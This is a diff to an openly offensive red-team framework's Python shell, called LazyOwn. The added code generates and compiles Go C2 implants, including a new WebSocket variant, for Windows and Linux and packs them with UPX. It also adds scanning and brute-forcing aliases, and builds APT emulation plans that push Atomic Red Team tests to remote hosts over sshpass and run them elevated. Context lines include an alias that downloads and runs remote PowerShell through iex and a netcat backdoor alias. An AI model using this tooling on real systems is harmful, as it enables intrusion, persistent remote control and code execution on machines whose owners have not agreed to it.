@@ -34,6 +34,11 @@ with open('payload.json', 'r') as file:
     c2_user = config.get("c2_user")
     c2_pass = config.get("c2_pass")
     c2_port = config.get("c2_port")
+    start_user = config.get("start_user")
+    start_pass = config.get("start_pass")
+    domain = config.get("domain")
+    dnswordlist = config.get("dnswordlist")
+    
 class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
@@ -93,6 +98,7 @@ class LazyOwnShell(cmd2.Cmd):
     lhost = config.lhost
     lport = config.lport
     c2_port = config.c2_port
+
     
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
@@ -102,6 +108,7 @@ class LazyOwnShell(cmd2.Cmd):
         "amnesiac": "sh pwsh -Command \"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac\"",
         "atomic_update":"sh cd external/.exploit/atomic-red-team && git pull",
         "auto": "pyautomate",
+        "autonuclei": f"sh bash -i \"nuclei  <(xq '.nmaprun.host[].address.\"@addr\"' sessions/scan_{rhost}.nmap.xml) -t ../nuclei-templates/\"",
         "aslr": "run lazyaslrcheck",
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
         "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
@@ -140,6 +147,8 @@ class LazyOwnShell(cmd2.Cmd):
         "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
         "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
         "nf": f"sh ./modules/nf -d {rhost} -o sessions/{rhost}_nuclerfuzzer",
+        "nmap_ldap_rootdse": f"sh sudo nmap -Pn --script ldap-rootdse.nse {rhost}",
+        "nxcridbrute": f"sh nxc smb {rhost} -u 'anonymous' -p '' --rid-brute 3000",
         "kallsyms": "sh sudo cat /proc/kallsyms",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazynmap.ls\"",
@@ -157,6 +166,7 @@ class LazyOwnShell(cmd2.Cmd):
         "randomuser": "sh curl 'https://randomuser.me/api/' -H 'Accept: application/json' | jq",
         "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
         "rustrevmakerlin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh linux {lhost} {lport}",
+        "showmount": f"sh showmount -e {rhost}",
         "t": "sh python3 modules/lazypyautogui.py",
         "tcpdump":"sh sudo tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
         "tcpdumpl":"sh sudo tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'",
@@ -217,7 +227,9 @@ class LazyOwnShell(cmd2.Cmd):
         self.lua.globals().app = self
         self.lua.globals().list_files_in_directory = self.list_files_in_directory
         self.load_plugins()
+        self.register_tool_commands()
         self.completekey = 'tab' 
+        
         self.params = {
             "binary_name": "gzip",
             "api_key": None,
@@ -375,6 +387,7 @@ class LazyOwnShell(cmd2.Cmd):
             return method(cmd_args)
         else:
             print_error(f"{YELLOW} Not Found {BLUE}{line}{RESET}")
+            
     def logcsv(self, line):
         command = line
         parts = command.split(maxsplit=1)
@@ -413,7 +426,7 @@ class LazyOwnShell(cmd2.Cmd):
                     self.output = f"{cmd_name} {command} {file.read()}"
         self.logcsv(f"{cmd_name} {command}")
         return
-    
+           
     def one_cmd(self, command):
         """
         Internal function to execute commands.
@@ -470,7 +483,80 @@ class LazyOwnShell(cmd2.Cmd):
         if not os.path.exists(directory):
             return []  # Devuelve una lista vacía si el directorio no existe
         return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
-    
+
+    def register_tool_commands(self):
+        """
+        Registra automáticamente todos los comandos .tool en la carpeta 'tools/'
+        Usa self.params para reemplazar {ip}, {port}, {domain}, {s}, etc.
+        """
+        tool_dir = "tools"
+        config = Config(load_payload())
+
+
+        if not os.path.exists(tool_dir):
+            print_error(f"[!] Folder '{tool_dir}' not found.")
+            return
+
+        for tool_file in glob.glob(os.path.join(tool_dir, "*.tool")):
+            try:
+                with open(tool_file, 'r') as f:
+                    tool_data = json.load(f)
+
+                tool_name = tool_data.get("toolname")
+                command_template = tool_data.get("command")
+                triggers = tool_data.get("trigger", [])
+                active = tool_data.get("active", False)
+
+                if not active or not tool_name or not command_template:
+                    continue
+
+                xmmll = f"sessions/scan_{rhost}.nmap.xml"
+                report = NmapParser.parse_fromfile(xmmll)
+                
+                for host in report.hosts:
+                    for service in host.services:
+                        if service.service in triggers or "all" in triggers:
+ 
+                            cmd_params = {
+                                "ip": host.address,
+                                "port": str(service.port),
+                                "domain": domain,
+                                "dnswordlist": dnswordlist,
+                                "service": service.service,
+                                "proto": service.protocol,
+                                "username": start_user,
+                                "password": start_pass,
+                                "outputdir": os.path.join(
+                                    f"sessions/{rhost}/{tool_name}/{tool_name}.txt",
+                                    host.address,
+                                    str(service.port),
+                                    tool_name
+                                ),
+                                "tunnel": "s" if service.tunnel == "ssl" else "",
+                   
+                            }
+
+                            os.makedirs(cmd_params["outputdir"], exist_ok=True)
+
+                            final_command = replace_command_placeholders(command_template, cmd_params)
+
+                            def tool_wrapper(*args, final_cmd=final_command):
+                                self.cmd(final_cmd)
+                            docstring = f"Tool:\n  {tool_name}\n\n"
+                            docstring += f"Example:\n  {final_command}\n\n"
+                            docstring += f"Triggered with:\n  {service.service}\n\n"
+                            docstring += f"protocol:\n  {service.protocol}\n\n"
+                            docstring += f"port:\n  {service.port}\n\n"
+                            docstring += f"ip:\n  {host.address}\n\n"
+                            docstring += f"logs:\n  {cmd_params["outputdir"]}\n"
+                            tool_wrapper.__doc__ = docstring
+
+                            setattr(self.__class__, f"do_{tool_name}", tool_wrapper)
+                            print_msg(f"Command '{tool_name}' register {service.service}) from tools")
+
+            except Exception as e:
+                print_error(f"[ERROR] Fallo al cargar plugin {tool_file}: {e}")
+
     def _register_lua_command(self, command_name, lua_function):
         """Registra un comando nuevo desde Lua."""
         def wrapper(arg):
@@ -10221,6 +10307,7 @@ class LazyOwnShell(cmd2.Cmd):
         file_evil = f"{path}/modules/evilhttprev.sh"
         filer = f"{path}/modules/r.sh"
         gofile = f"{path}/sessions/implant/implant_crypt.go"
+        gofile_ws = f"{path}/sessions/implant/implant_websocket.go"
         payload_sh = f"{path}/sessions/lin/payload.sh"
         gofile2 = f"{path}/sessions/implant/listener.go"
         gofile3 = f"{path}/sessions/implant/server.go"
@@ -10228,6 +10315,7 @@ class LazyOwnShell(cmd2.Cmd):
         server_go = f"{path}/sessions/server.go"
         monrevlin = f"{path}/sessions/monrevlin.go"
         implantgo = f"{path}/sessions/{line}"
+        implantgo_ws = f"{path}/sessions/ws_{line}"
         implantgo2 = f"{path}/sessions/l_{line}"
         implant_config_json = f"{path}/sessions/implant_config_{line}.json"
         maleable = self.params["c2_maleable_route"]
@@ -10243,6 +10331,9 @@ class LazyOwnShell(cmd2.Cmd):
         stealth = "True"
         random_string = base64_encoded.decode('utf-8')[:12]
         working_dir = f"{path}/sessions/"
+
+
+
         if not choice:
             choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
 
@@ -10379,7 +10470,9 @@ class LazyOwnShell(cmd2.Cmd):
         contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/r.sh", 'w+') as f:
             f.write(contentr)
-
+        with open(gofile_ws, 'r') as f:
+            content_ws = f.read()
+            
         with open(gofile, 'r') as f:
             content = f.read()
 
@@ -10393,18 +10486,27 @@ class LazyOwnShell(cmd2.Cmd):
             monrevlin_content = f.read()
 
         AES_KEY_hex = AES_KEY.hex()
+        
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
+        content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
+        
         monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
         implant_go = implantgo + ".go"
         implant_go2 = implantgo + "_l.go"
+        implant_go_ws = implantgo_ws + ".go"
         if platform == "windows":
             implantgo += ".exe"
             implantgo2 += "_l.exe"
+            implantgo_ws += ".exe"
+            
         with open(implant_go, 'w+') as f:
             f.write(content)
-        
+            
+        with open(implant_go_ws, 'w+') as f:
+            f.write(content_ws)    
+                
         with open(f"{implant_go2}", 'w+') as f:
             f.write(lcontent)
 
@@ -10413,10 +10515,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         with open(f"{monrevlin}", 'w+') as f:
             f.write(monrevlin_content)    
-
+        cmd = "cd sessions ; rm go.mod ; go mod init implant ; go get github.com/gorilla/websocket ; go get github.com/creack/pty"
+        self.cmd(cmd)
         if platform == "linux":
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
             compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
@@ -10429,6 +10533,8 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(compile_command2)
             self.cmd(compile_command3)
             self.cmd(compile_command4)
+            self.cmd(compile_command_ws)
+            
             self.cmd(cplib)
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
@@ -10452,6 +10558,7 @@ class LazyOwnShell(cmd2.Cmd):
         elif platform == "windows":
             binary = f"{line}.exe"
             compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
@@ -10465,6 +10572,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(compile_command)
             self.cmd(compile_command2)
             self.cmd(compile_command3)
+            self.cmd(compile_command_ws_win)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
             upx = f"upx {self.sessions_dir}/b{binary}"
@@ -20606,9 +20714,11 @@ class LazyOwnShell(cmd2.Cmd):
 
         platform = selected_test["platforms"][0]
         extension = ".sh" if platform in ["linux", "macos"] else ".ps1"
-
+        log_path = f"{tmp_path}/{test_id}.log"
+        
         if platform == "windows":
             test_script_content = f"""
+            Start-Transcript -Path "{log_path}"
             # Get prerequisite command
             {get_prereq_command}
             
@@ -20617,6 +20727,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             # Test command
             {command}
+            Stop-Transcript
             """.replace("            ","")
             cleanup_script_content = f"""
             # Cleanup command
@@ -20624,6 +20735,7 @@ class LazyOwnShell(cmd2.Cmd):
             """.replace("            ","")
         else:
             test_script_content = f"""#!/bin/sh
+            exec > >(tee -a {log_path}) 2>&1
             # Get prerequisite command
             {get_prereq_command}
 
@@ -20724,14 +20836,123 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_clean_agent.ps1' -Verb RunAs\""
             
-    
-      
+
         exit_code = self.cmd(rsync_command)
+        
+        # Transfer logs back to C2
+        log_path = f"{tmp_path}/*.log"
+        if extension == ".sh":
+            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:{log_path} {sessions_path}/"
+        else:
+            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:C:/Users/grisun0/Documents/lazyown_atomic_test/*.log {sessions_path}/"
+        self.cmd(scp_command)        
         
         if exit_code == 0:
             print_msg("Agent deployed and executed successfully.")
         else:
             print_error(f"Failed to synchronize files or agent. Exit code: {exit_code}")
+
+
+
+    def do_attack_plan(self, line):
+        """
+        Executes a multi-step APT simulation plan based on Atomic Red Team test IDs.
+
+        Parameters:
+        line (str) optional: Path to the YAML plan file.
+
+        Returns:
+        None
+        """
+        playbook_dir = "playbooks"
+
+        if not line.strip():
+            yaml_files = [f for f in os.listdir(playbook_dir) if f.endswith(".yaml") or f.endswith(".yml")]
+            if not yaml_files:
+                print_warn("No YAML playbooks found in the 'playbooks/' directory.")
+                return
+
+            print_msg("Available playbooks:")
+            for i, file in enumerate(yaml_files):
+                print(f"  [{i}] {file}")
+
+            try:
+                choice = int(input("Select a playbook number to execute: "))
+                if choice < 0 or choice >= len(yaml_files):
+                    print_warn("Invalid selection.")
+                    return
+                plan_file = os.path.join(playbook_dir, yaml_files[choice])
+            except ValueError:
+                print_warn("Invalid input. Please enter a number.")
+                return
+        else:
+            plan_file = os.path.join(playbook_dir, line.strip())
+
+        if not os.path.exists(plan_file):
+            print_warn(f"Plan file not found: {plan_file}")
+            return
+
+        with open(plan_file, 'r') as f:
+            plan = yaml.safe_load(f)
+
+        steps = plan.get("steps", [])
+        if not steps:
+            print_warn("No steps defined in plan.")
+            return
+
+        print_msg(f"Executing APT plan: {plan.get('apt_name', 'Unnamed')}\n{plan.get('description', '')}")
+
+        for i, step in enumerate(steps):
+            atomic_id = step.get("atomic_id")
+            if not atomic_id:
+                print_warn(f"Step {i+1} missing atomic_id.")
+                continue
+            print_msg(f"Generating step {i+1}: {atomic_id}")
+            self.do_atomic_gen(atomic_id)
+
+        # After generation, build ordered super-agent
+        sessions_path = os.path.join(os.getcwd(), "sessions")
+        tmp_path = "/tmp/lazyown_atomic_test"
+        extension = ".sh" if any(glob.glob(os.path.join(sessions_path, "*.sh"))) else ".ps1"
+        test_scripts = sorted(glob.glob(os.path.join(sessions_path, f"atomic_test_*.{extension[1:]}")))
+        clean_scripts = sorted(glob.glob(os.path.join(sessions_path, f"atomic_clean_test_*.{extension[1:]}")))
+
+        if extension == ".sh":
+            agent_lines = [
+                "#!/bin/bash",
+                "mkdir -p /tmp/lazyown_logs"
+            ]
+            agent_lines += [
+                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts
+            ]
+            agent_lines.append("tar czf /tmp/lazyown_logs.tar.gz /tmp/lazyown_logs")
+
+            clean_lines = [
+                "#!/bin/bash"
+            ]
+            clean_lines += [
+                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_scripts
+            ]
+        else:
+            agent_lines = [
+                f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts
+            ]
+            agent_lines.append("Compress-Archive -Path C:\\ProgramData\\lazyown_logs\\* -DestinationPath C:\\ProgramData\\lazyown_logs.zip")
+
+            clean_lines = [
+                f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in clean_scripts
+            ]
+
+        with open(os.path.join(tmp_path, f"apt_agent{extension}"), "w") as f:
+            f.write("\n".join(agent_lines))
+
+        with open(os.path.join(tmp_path, f"apt_clean_agent{extension}"), "w") as f:
+            f.write("\n".join(clean_lines))
+
+        print_msg(f"APT agent created and ready at: {tmp_path}/apt_agent{extension}")
+        print_msg(f"Cleanup agent created: {tmp_path}/apt_clean_agent{extension}")
+
+
 
     def do_mitre_test(self, line):
         """
@@ -20834,6 +21055,186 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg("Unknown command. Use 'list', 'tactic', or 'technique'.")
         except Exception as e:
             print_error(f"Error: {e}")
+
+
+    def do_generate_playbook(self, line):
+        """
+        Generates a playbook that integrates Atomic Red Team tests and MITRE ATT&CK techniques.
+
+        This function creates a playbook by combining tests from the Atomic Red Team repository
+        and techniques from the MITRE ATT&CK framework. The playbook includes detailed information
+        about each test and technique, making it a comprehensive resource for emulating adversary
+        behaviors.
+
+        Parameters:
+        line (str): Command-line arguments for specifying the playbook name and optional filters.
+                    The filters can be applied to various attributes of the tests and techniques,
+                    including but not limited to:
+                    - name: Filter by the name of the test or technique.
+                    - description: Filter by keywords in the description of the test or technique.
+                    - mitre_id: Filter by the MITRE ATT&CK technique ID.
+                    - platforms: Filter by the supported platforms (e.g., windows, linux, macos).
+                    - tactic: Filter by the MITRE ATT&CK tactic associated with the technique.
+                    - data_sources: Filter by the data sources mentioned in the technique.
+                    - defensive_measures: Filter by the defensive measures mentioned in the technique.
+                    - examples: Filter by examples mentioned in the technique.
+                    - references: Filter by references or URLs mentioned in the technique.
+                    - related_techniques: Filter by related techniques mentioned in the technique.
+                    - mitigations: Filter by mitigations mentioned in the technique.
+
+        Returns:
+        None
+
+        Example Usage:
+        do_generate_playbook("ExamplePlaybook persistence lateral_movement windows")
+        This command will generate a playbook named "ExamplePlaybook" that includes tests and
+        techniques related to "persistence", "lateral_movement", and the "windows" platform.
+        """
+        # Define paths
+        atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
+        atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
+        atomic_yaml_path = os.path.join(atomic_path, "atomics")
+        mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
+        mitre_path = os.path.join("external", ".exploit", "mitre")
+        enterprise_attack_path = os.path.join(mitre_path, "enterprise-attack", "enterprise-attack-16.1.json")
+        playbook_dir = "playbooks"
+
+        # Clone or update repositories if necessary
+        if not os.path.exists(atomic_path):
+            print_warn("Atomic Red Team repository not found. Cloning...")
+            self.cmd(f"git clone {atomic_repo} {atomic_path}")
+            print_msg("Repository cloned successfully.")
+        else:
+            command = f"cd {atomic_path} && git pull"
+            print_msg("Try to update...")
+            self.cmd(command)
+
+        if not os.path.exists(mitre_path):
+            print_warn("MITRE ATT&CK repository not found. Cloning...")
+            os.makedirs(mitre_path, exist_ok=True)
+            self.cmd(f"git clone {mitre_repo} {mitre_path}")
+            print_msg("Repository cloned successfully.")
+
+        if not os.path.exists(enterprise_attack_path):
+            print_warn("Error: Enterprise ATT&CK dataset not found in the cloned repository.")
+            print_warn("Please verify the repository structure.")
+            return
+
+        # Load MITRE ATT&CK data
+        with open(enterprise_attack_path, "r") as f:
+            attack_data = json.load(f)
+
+        attack_store = MemoryStore(stix_data=attack_data)
+
+        # Parse command-line arguments
+        args = line.split()
+        if not args:
+            print_msg("Usage: generate_playbook <name> [filters]")
+            return
+
+        playbook_name = args[0]
+        filters = args[1:]
+
+        # Create playbook directory if it doesn't exist
+        if not os.path.exists(playbook_dir):
+            os.makedirs(playbook_dir)
+
+        # Define the playbook structure
+        playbook = {
+            "apt_name": playbook_name,
+            "description": f"Playbook generated for {playbook_name}",
+            "steps": []
+        }
+
+        # Load Atomic Red Team tests
+        yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
+        tests = {}
+        for file in yaml_files:
+            with open(file, "r") as f:
+                data = yaml.safe_load(f)
+                if "atomic_tests" in data:
+                    for test in data["atomic_tests"]:
+                        tests[test["auto_generated_guid"]] = {
+                            "name": test["name"],
+                            "description": test.get("description", "No description available"),
+                            "platforms": test.get("supported_platforms", []),
+                            "command": test.get("executor", {}).get("command", "No command available"),
+                            "prereq_command": test.get("dependencies", [{}])[0].get("prereq_command", ""),
+                            "get_prereq_command": test.get("dependencies", [{}])[0].get("get_prereq_command", ""),
+                            "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
+                            "input_arguments": test.get("input_arguments", {}),
+                            "mitre_id": data.get("attack_technique", "No MITRE ID available"),
+                            "references": test.get("references", [])
+                        }
+
+        # Debug: Print the number of tests loaded
+        print_msg(f"Loaded {len(tests)} Atomic Red Team tests.")
+
+        # Filter tests based on command-line arguments
+        filtered_tests = {}
+        for test_id, test in tests.items():
+            if all(filter_term.lower() in test["name"].lower() or filter_term.lower() in test["description"].lower() for filter_term in filters):
+                filtered_tests[test_id] = test
+
+        # Debug: Print the number of filtered tests
+        print_msg(f"Filtered {len(filtered_tests)} Atomic Red Team tests based on filters: {filters}")
+
+        # Add filtered tests to the playbook with MITRE ATT&CK information
+        for test_id, test in filtered_tests.items():
+            mitre_technique = attack_store.query([
+                Filter("type", "=", "attack-pattern"),
+                Filter("external_references.external_id", "=", test["mitre_id"])
+            ])
+
+            if mitre_technique:
+                mitre_technique = mitre_technique[0]
+                mitre_info = {
+                    "mitre_id": test["mitre_id"],
+                    "mitre_name": mitre_technique.get("name", "No name available"),
+                    "mitre_description": mitre_technique.get("description", "No description available"),
+                    "mitre_platforms": mitre_technique.get("x_mitre_platforms", []),
+                    "mitre_data_sources": mitre_technique.get("x_mitre_data_sources", []),
+                    "mitre_defensive_measures": mitre_technique.get("x_mitre_defensive_measures", []),
+                    "mitre_examples": mitre_technique.get("x_mitre_examples", []),
+                    "mitre_references": [ref.get("url") for ref in mitre_technique.get("external_references", [])],
+                    "mitre_related_techniques": mitre_technique.get("x_mitre_related_techniques", []),
+                    "mitre_mitigations": mitre_technique.get("x_mitre_mitigations", [])
+                }
+            else:
+                mitre_info = {
+                    "mitre_id": test["mitre_id"],
+                    "mitre_name": "No name available",
+                    "mitre_description": "No description available",
+                    "mitre_platforms": [],
+                    "mitre_data_sources": [],
+                    "mitre_defensive_measures": [],
+                    "mitre_examples": [],
+                    "mitre_references": [],
+                    "mitre_related_techniques": [],
+                    "mitre_mitigations": []
+                }
+
+            playbook["steps"].append({
+                "atomic_id": test_id,
+                "name": test["name"],
+                "description": test["description"],
+                "platforms": test["platforms"],
+                "command": test["command"],
+                "prereq_command": test["prereq_command"],
+                "get_prereq_command": test["get_prereq_command"],
+                "cleanup_command": test["cleanup_command"],
+                "input_arguments": test["input_arguments"],
+                "references": test["references"],
+                "mitre_info": mitre_info
+            })
+
+        # Save the playbook to a YAML file
+        playbook_file = os.path.join(playbook_dir, f"{playbook_name}.yaml")
+        with open(playbook_file, "w") as f:
+            yaml.dump(playbook, f, default_flow_style=False)
+
+        print_msg(f"Playbook '{playbook_name}' generated successfully with {len(playbook['steps'])} steps.")
+
 
     def do_bbot(self, line):
         """
